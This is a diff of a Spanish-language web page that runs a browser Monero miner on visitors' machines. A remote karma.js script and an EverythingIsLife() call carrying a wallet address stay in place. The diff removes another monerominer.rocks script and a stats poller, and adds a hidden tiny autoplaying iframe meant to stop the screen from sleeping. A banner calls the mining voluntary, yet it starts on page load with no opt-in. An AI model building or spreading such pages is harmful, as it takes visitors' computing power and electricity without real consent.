@@ -56,30 +56,8 @@
             }
           }
             document.addEventListener("keydown", handleShortcut);
-
-
 </script>
-<script>
-    const apiUrl = 'https://api.moneroocean.stream/miner/4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN/stats/x';
-    const output = document.getElementById('output');
-
-    async function actualizarDatos() {
-      try {
-        const response = await fetch(apiUrl);
-        if (!response.ok) throw new Error('Error en la respuesta de la API');
-        const data = await response.json();
-        output.textContent = JSON.stringify(data, null, 2);
-      } catch (error) {
-        output.textContent = 'Error: ' + error.message;
-      }
-    }
-
-    // Llamar la función cada segundo
-    actualizarDatos(); // llamada inicial
-    setInterval(actualizarDatos, 1000);
-</script>
-            <!--end ip-->
-<script src="https://script.monerominer.rocks"></script>
+<!--end ip-->
 <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
 <script type="text/javascript">
 EverythingIsLife('4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN', 'x', 30);
@@ -99,7 +77,7 @@ EverythingIsLife('4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s
   }
 
 </style> 
-    <center><h1>Me estas ayudando ahora mismo, estas minando criptomonedas. Si quieres parar, cierra esta web. Esto es un acto totalmente voluntario. Muchas gracias. Abajo puedes los datos.</h1></center>
-    <pre id="output">Cargando...</pre>
+    <center><h1>Me estas ayudando ahora mismo, estas minando criptomonedas. Si quieres parar, cierra esta web. Esto es un acto totalmente voluntario. Muchas gracias.</h1></center>
+    <iframe width="4" height="2" src="https://www.youtube-nocookie.com/embed/jcDZ7TdKvLg?autoplay=1&loop=1&playlist=jcDZ7TdKvLg&mute=1" title="esto es para q no se apage la pantalla" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 </body>
 </html>
